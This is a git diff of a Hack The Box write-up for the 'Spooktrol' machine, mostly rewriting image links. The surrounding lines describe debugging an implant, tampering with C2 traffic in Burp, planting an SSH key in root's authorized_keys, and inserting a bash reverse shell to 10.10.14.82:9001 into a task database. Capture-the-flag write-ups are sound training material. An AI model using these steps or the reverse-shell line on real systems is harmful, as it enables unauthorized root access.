@@ -69,45 +69,49 @@ wget 'http://10.10.11.123/file_management/?file=implant'
 
 On running the binary hit some error regarding `json`
 
+
 ![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028162957.png)
+
+
+
 
 
 Running wireshark 
 
-![](Pasted image 20211028164325.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028164325.png)
 
 we found the domain and need to add to `/etc/hosts` file.
 
 Analyzing binary in ghidra 
 
-![](Pasted image 20211028164739.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028164739.png)
 
 1st flag
 
-![](Pasted image 20211028164912.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028164912.png)
 
 break at `0x402013` to get 1st flag using `gdb`.
 
 `finish` the function then you will get the flag.
 
-![](Pasted image 20211028165356.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028165356.png)
 
 # User
 
 break at system in upload funtion in case 3
 
-![](Pasted image 20211028165651.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028165651.png)
 
 
 inorder to acheive case three we can use burpsuite, first we need to interscept at locally the binnary 
 
 change host file as following.
 
-![](Pasted image 20211028165920.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028165920.png)
 
 Then add a second proxy at burp.
 
-![](Pasted image 20211028170055.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028170055.png)
 
 Thirdly use socat to redirect port 8081 to port 80
 
@@ -115,7 +119,7 @@ Thirdly use socat to redirect port 8081 to port 80
 
 next use match and replace to change reponse task1 to task3
 
-![](Pasted image 20211028170359.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028170359.png)
 
 its worked.
 
@@ -133,43 +137,50 @@ curl: (26) Failed to open/read local data from file/application
 
 It returned as an error beause it is looking for some like we need to find that using gdp. lets break at system.
 
-![](Pasted image 20211028184718.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028184718.png)
 
 On examine at $rdi we can find that it is looking for file `whoami` lets replace that in burpsuite in `match and replace` into `/etc/passwd`
 
 
-![](Pasted image 20211028184924.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028184924.png)
 
 
 we got replaced in next attempt.
 
-![](Pasted image 20211028185028.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185028.png)
 
 
-![](Pasted image 20211028185049.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185049.png)
+Now lets change `/etc/passwd` to our ssh public key
 
-Now lets change `/etc/passwd` to our ssh public key.
 
-
-![](Pasted image 20211028185303.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185303.png)
 
 
 upload the public to root's authorized_keys
 
-![](Pasted image 20211028185412.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185412.png)
 
 # Root
 
 Logged in as root in docker.
 
-![](Pasted image 20211028185502.png)
+
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185502.png)
+
+![user](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185502.png)
+
 
 insert reverse into database task
 
 `INSERT INTO tasks VALUES(13,'10a6dd5dde6094059db4d23d7710ae12',0,1,'bash -c "bash -i >& /dev/tcp/10.10.14.82/9001 0>&1"','',X'726f6f740a');`
 
-![](Pasted image 20211028190236.png)
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028190236.png)
 
 Got reverse shell as root
 
-![](Pasted image 20211028190141.png)
+
+![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028190141.png)
+
+
+
